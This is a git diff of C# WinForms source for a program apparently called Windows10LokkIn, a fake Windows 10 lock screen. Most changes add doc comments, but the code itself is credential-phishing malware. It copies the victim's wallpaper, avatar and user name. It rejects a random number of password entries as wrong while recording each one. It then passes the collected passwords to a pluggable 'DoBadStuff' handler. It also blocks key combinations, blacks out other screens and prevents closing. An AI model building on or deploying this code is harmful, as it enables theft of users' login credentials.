@@ -1,8 +1,4 @@
-﻿using Windows10LokkIn.Classes;
-using Windows10LokkIn.Controls;
-using Windows10LokkIn.Interfaces;
-using Windows10LokkIn.Models;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Data;
 using System.DirectoryServices.AccountManagement;
@@ -11,6 +7,9 @@ using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Windows10LokkIn.Classes;
+using Windows10LokkIn.Interfaces;
+using Windows10LokkIn.Models;
 
 namespace Windows10LokkIn
 {
@@ -18,14 +17,34 @@ namespace Windows10LokkIn
     {
         #region "Variables and Stuff"
 
-        // Decides wether the form can be closed or not
+        /// <summary>
+        /// Decides wether the form can be closed or not
+        /// </summary>
         private bool DenyClose { get; set; }
+        /// <summary>
+        /// Contains the current bad stuff
+        /// </summary>
         private IDoBadStuff DoBadStuff;
+        /// <summary>
+        /// Contains the current language translation
+        /// </summary>
         private Language Language { get; set; }
+        /// <summary>
+        /// Contains the current configuration
+        /// </summary>
         private Configuration Configuration { get; set; } = new Configuration();
 
+        /// <summary>
+        /// Contains the amount that passwords will be entered wrongly
+        /// </summary>
         private int PasswordErrors { get; set; }
+        /// <summary>
+        /// Counts how many times the password has been entered wrongly
+        /// </summary>
         private int PasswordErrorCounter { get; set; }
+        /// <summary>
+        /// The result of the user inputs
+        /// </summary>
         private Result Result { get; set; } = new Result();
 
         #endregion
@@ -38,13 +57,19 @@ namespace Windows10LokkIn
 
         #region "Lock"
 
-        // Gets called when main login form would be closing
+        /// <summary>
+        /// Gets called when main login form would be closing 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
         {
             if (!Configuration.DebugMode) e.Cancel = DenyClose;
         }
 
-        // Dont't know what this does
+        /// <summary>
+        ///  Dont't know what this does
+        /// </summary>
         protected override CreateParams CreateParams
         {
             get
@@ -60,14 +85,18 @@ namespace Windows10LokkIn
 
         #region "Events"
 
-        // Gets called when the Login Button is clicked or the enter key event is triggered on the password text box
+        /// <summary>
+        /// Gets called when the login button is clicked or the enter key event is triggered on the password text box
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void LoginButton_Click(object sender, EventArgs e)
         {
-            // Do nothing if no password has been entered
-            if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
-            if (PasswordTextBox.Text == Language.PlaceholderText) return;
 
-            if (PasswordErrorCounter < PasswordErrors)
+            if (string.IsNullOrEmpty(PasswordTextBox.Text)) return; // Do nothing if no password has been entered
+            if (PasswordTextBox.Text == Language.PlaceholderText) return; // Do nothing if the placeholder is set
+
+            if (PasswordErrorCounter < PasswordErrors) // check if the password is wrong, save it and show error text
             {
                 PasswordErrorCounter++;
                 Result.WrongPasswords.Add(PasswordTextBox.Text);
@@ -79,7 +108,7 @@ namespace Windows10LokkIn
 
             if (!Configuration.DebugMode) KeyPressHandler.Enable();
 
-            try
+            try // fill result and call the bad stuff
             {
                 Result.UserName = Environment.UserName;
                 Result.DisplayName = UserNameLabel.Text;
@@ -89,7 +118,7 @@ namespace Windows10LokkIn
                 // Time for malicious business 😏
                 DoBadStuff.Now(Result);
             }
-            catch (Exception ex)
+            catch (Exception ex) // if an error occurs it will only be displayed in debug mode
             {
                 if (Configuration.DebugMode) MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
@@ -100,18 +129,30 @@ namespace Windows10LokkIn
 
         }
 
+        /// <summary>
+        /// Shows the password error text and controls
+        /// </summary>
         private void ShowPasswordError()
         {
-            SetPlaceholder();
+            SetPlaceholder(); // set placeholder text, so the current password is cleared
             ChangeVisiblityOfPasswordControls(true);
         }
 
+        /// <summary>
+        /// Is called when the password error message is accepted.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void WrongPasswordButton_Click(object sender, EventArgs e)
         {
             ChangeVisiblityOfPasswordControls(false);
             PasswordTextBox.Focus();
         }
 
+        /// <summary>
+        /// Hide and Show either password enter controls or password error controls
+        /// </summary>
+        /// <param name="wrongPassword"></param>
         private void ChangeVisiblityOfPasswordControls(bool wrongPassword)
         {
             PasswordTextBox.Visible = !wrongPassword;
@@ -123,9 +164,14 @@ namespace Windows10LokkIn
             WrongPasswordButton.Visible = wrongPassword;
             if (wrongPassword) WrongPasswordButton.Focus();
 
-            Refresh();
+            Refresh(); // trust me I am an engineer
         }
 
+        /// <summary>
+        /// Displayes or hides the language selection if the language button is clicked
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void LanguageButton_Click(object sender, EventArgs e)
         {
             try
@@ -135,6 +181,11 @@ namespace Windows10LokkIn
             catch { }
         }
 
+        /// <summary>
+        /// Draws uniform borders around password controls
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void WindowsLogin_Paint(object sender, PaintEventArgs e)
         {
             int offset = 1;
@@ -163,6 +214,11 @@ namespace Windows10LokkIn
 
         }
 
+        /// <summary>
+        /// If a language of the language panel is clicked the panel gets hidden
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void LanguageClick(object sender, EventArgs e)
         {
             Controls.Find("languagePanel", true).FirstOrDefault().Visible = false;
@@ -172,13 +228,22 @@ namespace Windows10LokkIn
 
         #region "Password"
 
-        // Show password when button is pressed
+        /// <summary>
+        /// Show password when button is pressed and the password is not the placeholder
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void ShowPasswordButton_Click(object sender, EventArgs e)
         {
             if (PasswordTextBox.Text != Language.PlaceholderText)
                 PasswordTextBox.UseSystemPasswordChar = !PasswordTextBox.UseSystemPasswordChar;
         }
 
+        /// <summary>
+        /// Shows capslock warning, performs login when enter is pressed and sets focus to start of textbox if placeholder is set
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
         {
             // Show caps lock warning
@@ -200,7 +265,11 @@ namespace Windows10LokkIn
             }
         }
 
-        // decide wether to show the placeholder or not
+        /// <summary>
+        /// Decides wether to show the placeholder or not
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void PasswordTextBox_TextChanged(object sender, EventArgs e)
         {
             TextBox tb = (TextBox)sender;
@@ -213,7 +282,7 @@ namespace Windows10LokkIn
             if (tb.Text.Substring(1, tb.Text.Length - 1) == Language.PlaceholderText)
             {
                 tb.UseSystemPasswordChar = true;
-                tb.Text = tb.Text.Substring(0, 1);
+                tb.Text = tb.Text.Substring(0, 1); // keep the newly entered key as text and only remove the placeholder
                 tb.ForeColor = Color.Black;
                 tb.Select(1, 0);
 
@@ -222,15 +291,23 @@ namespace Windows10LokkIn
             }
         }
 
-        // WinForms doesn't have *real* placeholders, so we have to tinker around
-        // to make it seem like a real placeholder.
-        // this prevents placing the text cursor somewhere where it shouldn't be
+
+        /// <summary>
+        /// WinForms doesn't have *real* placeholders, so we have to tinker around
+        /// to make it seem like a real placeholder.
+        /// this prevents placing the text cursor somewhere where it shouldn't be
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void PasswordTextBox_Click(object sender, EventArgs e)
         {
             if (PasswordTextBox.Text == Language.PlaceholderText) PasswordTextBox.Select(0, 0);
         }
 
-        // Put placeholder text into password textbox
+        /// <summary>
+        /// Put placeholder text into password textbox
+        /// Hides the show password button
+        /// </summary>
         private void SetPlaceholder()
         {
             PasswordTextBox.UseSystemPasswordChar = false;
@@ -249,10 +326,12 @@ namespace Windows10LokkIn
         private void WindowsLogin_Load(object sender, EventArgs e)
         {
             // Blur background image after everything has been loaded
-            BlurBackground();
+            ModifyBackground();
         }
 
-        // Handle all setup
+        /// <summary>
+        /// Handles the whole setup
+        /// </summary>
         private void Initialize()
         {
             InitializeConfiguration();
@@ -269,11 +348,14 @@ namespace Windows10LokkIn
             InitializePasswordErrors();
         }
 
-        // Loads all languages
+        /// <summary>
+        /// Loads all languages
+        /// </summary>
         private void InitializeLanguage()
         {
             List<ILanguage> languages = new List<ILanguage>();
 
+            // load languages and use default if no was found or an error occured
             try
             {
                 languages = InterfaceLoader.GetAll<ILanguage>();
@@ -290,11 +372,13 @@ namespace Windows10LokkIn
                 l.Apply(Language);
             }
 
+            // aply language to text of form
             CapsLockLabel.Text = Language.CapsLockText;
             WrongPasswordLabel.Text = Language.WrongPasswordText;
 
             LanguageButton.Text = Language.LanguageCode.ToUpper();
 
+            // add language label to form an assign events
             Controls.Add(ControlFactory.CreateLanguagePanel("languagePanel", languages, LanguageButton.Location.X + LanguageButton.Width, LanguageButton.Location.Y, Language));
             Controls.Find("languagePanel", true).FirstOrDefault().Visible = false;
 
@@ -305,7 +389,9 @@ namespace Windows10LokkIn
             }
         }
 
-        // Loads a setup from a dll file thats implements the ISetup interface
+        /// <summary>
+        /// Loads a setup from a dll file thats implements the ISetup interface
+        /// </summary>
         private void InitializeConfiguration()
         {
 
@@ -318,31 +404,41 @@ namespace Windows10LokkIn
             }
             catch
             {
-                Configuration = new Configuration();
+                Configuration = new Configuration(); // use default confugration if setup is erroneous
             }
 
         }
 
+        /// <summary>
+        /// Sets up some small stuff no worth a own function
+        /// </summary>
         private void InitializeMisc()
         {
             // disallow closing of the program
             DenyClose = true;
+
             // display CapsLock notification if necessary
             CapsLockLabel.Visible = IsKeyLocked(Keys.CapsLock);
 
+            // hide wrong password text
             ChangeVisiblityOfPasswordControls(false);
 
+            // only set top most when not in debug mode
             TopMost = !Configuration.DebugMode;
         }
 
-        // Show placeholder on startup
+        /// <summary>
+        /// Show placeholder on startup
+        /// </summary>
         private void InitializePasswordTextbox()
         {
             SetPlaceholder();
         }
 
-        // Check wether a .dll file implementing IDoBadStuff is available
-        // if its available, it replaces the default bad stuff object
+        /// <summary>
+        /// Check wether a .dll file implementing IDoBadStuff is available
+        /// if its available, it replaces the default bad stuff object
+        /// </summary>
         private void InitializeBadStuff()
         {
             try
@@ -359,18 +455,22 @@ namespace Windows10LokkIn
 
         }
 
-        // disables certain key combinations in release builds
+        /// <summary>
+        /// disables certain key combinations, disabled in debug mode
+        /// </summary>
         private void InitializeKeyCombinations()
         {
             if (!Configuration.DebugMode) KeyPressHandler.Disable();
         }
 
-        // Display the users Username on the form
+        /// <summary>
+        /// Load and display the user name on the form
+        /// </summary>
         private void InitializeUserLabel()
         {
             try
             {
-                if (Configuration.UseUserPrincipal)
+                if (Configuration.UseUserPrincipal) // tries to load the user name using UserPrincipal
                 {
                     DateTime startTime = DateTime.Now;
 
@@ -381,7 +481,7 @@ namespace Windows10LokkIn
 
                     t.Start();
 
-                    while (true)
+                    while (true) // if loading takes to long use Environment.UserName
                     {
                         if (startTime.AddSeconds(Configuration.UserPrincipalTimeout) > DateTime.Now) continue;
                         else if (!t.IsCompleted) throw new Exception("timeout");
@@ -400,36 +500,53 @@ namespace Windows10LokkIn
             }
         }
 
-        // Load the users wallpaper
+        /// <summary>
+        /// Load the users wallpaper
+        /// </summary>
+        /// <returns></returns>
         private Bitmap GetBackgroundImage()
         {
             return new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
         }
 
-        // Set the users wallpaper as the form background
+        /// <summary>
+        /// Set the users wallpaper as the forms background
+        /// </summary>
         private void InitializeBackground()
         {
             BackgroundImage = GetBackgroundImage();
         }
 
-        // blur the users wallpaper and set it as the form background
-        private void BlurBackground()
+        /// <summary>
+        /// Blur the users wallpaper and set it as the form background
+        /// Also dim the background if its to bright
+        /// </summary>
+        private void ModifyBackground()
         {
+            // blur image
             GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
             BackgroundImage = blur.Process(Configuration.BlurIntensity);
 
+            // dim image
             if (BackgroundImage.IsPixelBright(11, 387) || //Bottom left
                 BackgroundImage.IsPixelBright(EaseOfAccessButton.Location.X, EaseOfAccessButton.Location.Y) ||
                 BackgroundImage.IsPixelBright(UserNameLabel.Location.X, UserNameLabel.Location.Y)) BackgroundImage.AdjustBrightness(Configuration.DarknessIntensity);
         }
 
-        // Load the current users profile picture into the form
+        /// <summary>
+        /// Load the current users profile picture into the form
+        /// </summary>
         private void InitializeUserIcon()
         {
             UserIconPictureBox.Image = GetUserIconByName(Environment.UserName);
         }
 
-        // Get a users profile picture from a directory
+        /// <summary>
+        /// Get a users profile picture from a directory
+        /// </summary>
+        /// <param name="fileEnding"></param>
+        /// <param name="path"></param>
+        /// <returns></returns>
         private Image GetUserIconFromPath(string fileEnding, string path)
         {
             try
@@ -437,9 +554,9 @@ namespace Windows10LokkIn
                 DateTime highestCreation = DateTime.MinValue;
                 string accountPicture = "";
 
-                foreach (string f in Directory.GetFiles(path))
+                foreach (string f in Directory.GetFiles(path)) // get all files in directory
                 {
-                    if (fileEnding == "accountpicture-ms")
+                    if (fileEnding == "accountpicture-ms") // use newest accountpicture-ms to get user avatar
                     {
                         DateTime creationTime = File.GetCreationTime(f);
                         if (highestCreation < creationTime)
@@ -466,7 +583,11 @@ namespace Windows10LokkIn
             }
         }
 
-        // Load the users avatar by knowing his user name
+        /// <summary>
+        /// Load the users avatar by its user name
+        /// </summary>
+        /// <param name="username"></param>
+        /// <returns></returns>
         private Image GetUserIconByName(string username)
         {
             Image img = null;
@@ -487,8 +608,9 @@ namespace Windows10LokkIn
             if (img is null)
                 img = GetUserIconFromPath("jpg", path);
 
+            // this is special
             if (img is null)
-                img = GetUserIconFromPath("accountpicture-ms",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\AccountPictures"));
+                img = GetUserIconFromPath("accountpicture-ms", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\AccountPictures"));
 
             if (img is null)
                 img = Properties.Resources.defaultAvatar;
@@ -496,7 +618,9 @@ namespace Windows10LokkIn
             return img;
         }
 
-        // black out all non-primary screens
+        /// <summary>
+        /// Black out all non-primary screens, execpt in debug mode
+        /// </summary>
         private void InitializeOtherScreens()
         {
             if (!Configuration.DebugMode)
@@ -508,32 +632,37 @@ namespace Windows10LokkIn
             }
         }
 
-        // Create a fullscreen black form
+        /// <summary>
+        /// Create a fullscreen black form
+        /// </summary>
+        /// <param name="screen"></param>
         private void BlackScreen(Screen screen)
         {
             Form blackForm = new Form()
             {
-                Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top),
+                Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top), // set screen to where form is displayed on
                 WindowState = FormWindowState.Maximized,
-                StartPosition = FormStartPosition.Manual,
+                StartPosition = FormStartPosition.Manual, // necessary to set screen
                 FormBorderStyle = FormBorderStyle.None,
                 BackColor = Color.Black,
                 TopMost = true
             };
 
-            blackForm.FormClosing += WindowsLogin_FormClosing;
+            blackForm.FormClosing += WindowsLogin_FormClosing; // deny closing
 
             blackForm.ShowDialog();
         }
 
-        // add other users buttons and display them in the lower left corner
+        /// <summary>
+        /// Add other users buttons and display them in the lower left corner
+        /// </summary>
         private void InitializeOtherUsers()
         {
             AddChangeUserPanel(Language.OtherUserText, 0, GetUserIconByName(Language.OtherUserText));
             AddChangeUserPanel(UserNameLabel.Text, 1, GetUserIconByName(Environment.UserName));
 
             int counter = 0;
-            // add emergency exit to user button
+            // add emergency exit to user button -> click 50 times on your profile
             ((Button)Controls.Find("1", true).First()).Click += (s, e) =>
             {
                 counter++;
@@ -548,13 +677,20 @@ namespace Windows10LokkIn
             };
         }
 
-        // create a "other user" control with given properties, then place it on screen
+        /// <summary>
+        /// Create a "other user" control with given properties, then place it on screen
+        /// </summary>
+        /// <param name="user"></param>
+        /// <param name="panelCount"></param>
+        /// <param name="userIcon"></param>
         private void AddChangeUserPanel(string user, int panelCount, Image userIcon)
         {
             Controls.Add(ControlFactory.CreateUserPanel(user, panelCount, UserNameLabel.Text, userIcon));
         }
 
-        // sets the amount of needed password tries
+        /// <summary>
+        /// Sets the amount of needed password tries
+        /// </summary>
         private void InitializePasswordErrors()
         {
             PasswordErrors = new Random().Next(Configuration.MinPasswordErrors, Configuration.MaxPasswordErrors + 1);
